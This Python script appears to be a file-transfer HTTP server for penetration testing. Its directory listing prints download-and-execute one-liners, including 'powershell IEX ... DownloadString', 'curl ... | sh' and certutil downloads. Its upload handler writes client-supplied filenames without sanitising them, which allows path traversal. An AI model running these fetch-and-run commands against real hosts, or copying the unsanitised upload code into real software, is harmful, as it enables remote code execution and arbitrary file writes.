#!/usr/bin/env python3
  
__version__ = "0.1"
__all__ = ["SimpleHTTPRequestHandler"]
__author__ = "test"
__home_page__ = "test"
 
import os, sys
import os.path, time
import posixpath
import http.server
import socketserver
import urllib.request, urllib.parse, urllib.error
import html
import shutil
import mimetypes
import re
import argparse
import base64

from io import BytesIO

def fbytes(B):
   'Return the given bytes as a human friendly KB, MB, GB, or TB string'
   B = float(B)
   KB = float(1024)
   MB = float(KB ** 2) # 1,048,576
   GB = float(KB ** 3) # 1,073,741,824
   TB = float(KB ** 4) # 1,099,511,627,776

   if B < KB:
      return '{0} {1}'.format(B,'Bytes' if 0 == B > 1 else 'Byte')
   elif KB <= B < MB:
      return '{0:.2f} KB'.format(B/KB)
   elif MB <= B < GB:
      return '{0:.2f} MB'.format(B/MB)
   elif GB <= B < TB:
      return '{0:.2f} GB'.format(B/GB)
   elif TB <= B:
      return '{0:.2f} TB'.format(B/TB)

class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
 
    """Simple HTTP request handler with GET/HEAD/POST commands.

    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method. And can reveive file uploaded
    by client.

    The GET/HEAD/POST requests are identical except that the HEAD
    request omits the actual contents of the file.

    """
 
    server_version = "SimpleHTTPWithUpload/" + __version__
    def do_GET(self):
        """Serve a GET request."""
        f = self.send_head()
        if f:
            self.copyfile(f, self.wfile)
            f.close()
 
    def do_HEAD(self):
        """Serve a HEAD request."""
        f = self.send_head()
        if f:
            f.close()
 
    def do_POST(self):
        """Serve a POST request."""
        r, info = self.deal_post_data()
        print((r, info, "by: ", self.client_address))
        f = BytesIO()
        if r:
            f.write(b"Success to upload")
        else:
            f.write(b"Failed to upload")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def deal_post_data(self):
        uploaded_files = []   
        content_type = self.headers['content-type']
        if not content_type:
            return (False, "Content-Type header doesn't contain boundary")
        boundary = content_type.split("=")[1].encode()
        remainbytes = int(self.headers['content-length'])
        line = self.rfile.readline()
        remainbytes -= len(line)
        if not boundary in line:
            return (False, "Content NOT begin with boundary")
        while remainbytes > 0:
            line = self.rfile.readline()
            remainbytes -= len(line)
            fn = re.findall(r'Content-Disposition.*name="file"; filename="(.*)"', line.decode())
            if not fn:
                return (False, "Can't find out file name...")
            path = self.translate_path(self.path)
            fn = os.path.join(path, fn[0])
            line = self.rfile.readline()
            remainbytes -= len(line)
            line = self.rfile.readline()
            remainbytes -= len(line)
            try:
                out = open(fn, 'wb')
            except IOError:
                return (False, "<br><br>Can't create file to write.<br>Do you have permission to write?")
            else:
                with out:                    
                    preline = self.rfile.readline()
                    remainbytes -= len(preline)
                    while remainbytes > 0:
                        line = self.rfile.readline()
                        remainbytes -= len(line)
                        if boundary in line:
                            preline = preline[0:-1]
                            if preline.endswith(b'\r'):
                                preline = preline[0:-1]
                            out.write(preline)
                            uploaded_files.append(fn)
                            break
                        else:
                            out.write(preline)
                            preline = line
        return (True, "<br><br>'%s'" % "'<br>'".join(uploaded_files))
 
    def send_head(self):
        """Common code for GET and HEAD commands.

        This sends the response code and MIME headers.

        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.

        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(path, 'rb')
        except IOError:
            self.send_error(404, "File not found")
            return None
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return f
 


    def list_directory(self, path):
        """Helper to produce a directory listing (absent index.html).

        Return value is either a file object, or None (indicating an
        error).  In either case, the headers are sent, making the
        interface the same as for send_head().

        """
        try:
            list = os.listdir(path)
        except os.error:
            self.send_error(404, "No permission to list directory")
            return None
        enc = sys.getfilesystemencoding()
        url = "http://"+str(self.client_address[0])+":"+str(PORT)+str(self.path)
        list.sort(key=lambda a: a.lower())
        f = BytesIO()
        displaypath = html.escape(urllib.parse.unquote(self.path))
        f.write(b'\033[0;31m')
        f.write(b'\n')
        f.write(b'+---------------------------------------+\n')
        f.write(b'|                Upload                 |\n')
        f.write(b'+---------------------------------------+\n')
        f.write(b'\033[0m')
        f.write(b"curl -F 'file=@\033[0;31m[uploadfile]\033[0m' ")
        f.write(('\033[0;32m%s\033[0m\n' % (url)).encode(enc))
        f.write(b'\033[0m\n')
        f.write(b"curl -F file=@\\\"\033[0;31m[uploadfile]\033[0m\\\" ")
        f.write(('\033[0;32m%s\033[0m\n' % (url)).encode(enc))
        f.write(b'\033[0m\n')
        f.write(b'\033[0;31m')
        f.write(b'\033[0m')
        f.write(("powershell (New-Object System.Net.WebClient).UploadFile('\033[0;32m%s\033[0m','POST', '\033[0;31m[uploadfile]\033[0m')" % (url)).encode(enc))
        f.write(b'\033[0m\n')
        f.write(b'\n\033[0;31m')
        f.write(b'+---------------------------------------+\n')
        f.write(b'|               directory               |\n')
        f.write(b'+---------------------------------------+\n')
        f.write(b'\033[0m')
        counterD = 0
        counterF = 0
        for name in list:
            fullname = os.path.join(path, name)
            displayname = linkname = name
            fsize = fbytes(os.path.getsize(fullname))
            created_date = time.ctime(os.path.getctime(fullname))
            # Append / for directories or @ for symbolic links
            if os.path.isdir(fullname):
                displayname = name + "/"
                linkname = name + "/"
                fsize = ''
                created_date = ''
            if os.path.islink(fullname):
                displayname = name + "@"
            if name.endswith(('.bmp','.gif','.jpg','.png')):
                dirimage = name
            if name.endswith(('.avi','.mpg')):
                pass
            if name.endswith(('.idx','.srt','.sub')):
                pass
            if name.endswith('.iso'):
                pass
                # Note: a link to a directory displays with @ and links with /
            
            if os.path.isdir(fullname) == False :
                f.write(b'\033[0;35m')
                f.write(('%sF_i- \033[0;32m%s\033[0m\n' % (counterF,linkname)).encode(enc))
                
                f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                f.write(b'curl        : ')
                f.write(b'\033[1;34m')
                f.write(('curl %s -o %s' % (str(url+urllib.parse.quote(linkname)),linkname)).encode(enc))
                f.write(b'\033[0m\n')
                
                f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                f.write(b'wget        : ')
                f.write(b'\033[1;34m')
                f.write(('wget %s ' % (str(url+urllib.parse.quote(linkname)))).encode(enc))
                f.write(b'\033[0m\n')
                
                f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                f.write(b'certutil.exe: ')
                f.write(b'\033[1;34m')
                f.write(('certutil.exe -urlcache -split -f %s %s' % (str(url+urllib.parse.quote(linkname)),linkname)).encode(enc))
                f.write(b'\033[0m\n')
                
                f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                f.write(b'powershell_1: ')
                f.write(b'\033[1;34m')
                f.write(('Invoke-WebRequest %s -OutFile %s' % (str(url+urllib.parse.quote(linkname)),linkname)).encode(enc))
                f.write(b'\033[0m\n')
                
                f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                f.write(b'powershell_2: ')
                f.write(b'\033[1;34m')
                f.write(('powershell IEX (New-Object Net.WebClient).DownloadString("%s");' % (str(url+urllib.parse.quote(linkname)))).encode(enc))
                f.write(b'\033[0m\n')
                

                filetypename = linkname.rsplit('.', 1)[-1]
                if (filetypename == 'sh'):
                    f.write(('\033[0;35m%sF_i_ \033[0m' % (counterF)).encode(enc))
                    f.write(b'curl & run  : ')
                    f.write(b'\033[1;34m')
                    f.write(('curl -L %s | sh' % (str(url+urllib.parse.quote(linkname)))).encode(enc))
                    f.write(b'\033[0m\n')
                
                
                f.write(b'\033[1;34m')
                counterF = counterF + 1
            else:
                f.write(b'\033[0;35m')
                f.write(('%sD_i- \033[0;33m%s\033[0m' % (counterD,linkname)).encode(enc))
                f.write(b'\033[0m\n')
                f.write(('\033[0;35m%sD_i_ \033[0m' % (counterD)).encode(enc))
                f.write(b'Link        : ')
                f.write(b'\033[1;34m')
                f.write(('%s' % (str(url+linkname))).encode(enc))
                f.write(b'\033[0m\n')
                counterD = counterD + 1
            f.write(b'\n')

            
                

        #url
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        return f

    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax.

        Components that mean special things to the local file system
        (e.g. drive or directory names) are ignored.  (XXX They should
        probably be diagnosed.)

        """
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        path = posixpath.normpath(urllib.parse.unquote(path))
        words = path.split('/')
        words = [_f for _f in words if _f]
        path = os.getcwd()
        for word in words:
            drive, word = os.path.splitdrive(word)
            head, word = os.path.split(word)
            if word in (os.curdir, os.pardir): continue
            path = os.path.join(path, word)
        return path
 
    def copyfile(self, source, outputfile):
        """Copy all data between two file objects.

        The SOURCE argument is a file object open for reading
        (or anything with a read() method) and the DESTINATION
        argument is a file object open for writing (or
        anything with a write() method).

        The only reason for overriding this would be to change
        the block size or perhaps to replace newlines by CRLF
        -- note however that this the default server uses this
        to copy binary data as well.

        """
        shutil.copyfileobj(source, outputfile)
 
    def guess_type(self, path):
        """Guess the type of a file.

        Argument is a PATH (a filename).

        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.

        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.

        """
 
        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']
 
    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })
 
parser = argparse.ArgumentParser()
parser.add_argument('--bind', '-b', default='', metavar='ADDRESS',
                        help='Specify alternate bind address '
                             '[default: all interfaces]')
parser.add_argument('port', action='store',
                        default=80, type=int,
                        nargs='?',
                        help='Specify alternate port [default: 80]')
args = parser.parse_args()

PORT = args.port
BIND = args.bind
HOST = BIND

if HOST == '':
	HOST = 'localhost'

Handler = SimpleHTTPRequestHandler
# https://stackoverflow.com/questions/16433522/socketserver-getting-rid-of-errno-98-address-already-in-use
socketserver.TCPServer.allow_reuse_address = True

with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
	try:
	    serve_message = "Serving HTTP on {host} port {port} (http://{host}:{port}/) ..."
	    print(serve_message.format(host=HOST, port=PORT))
	    httpd.serve_forever()
	except:
	    print()
	    print("Server stop")
	    exit()


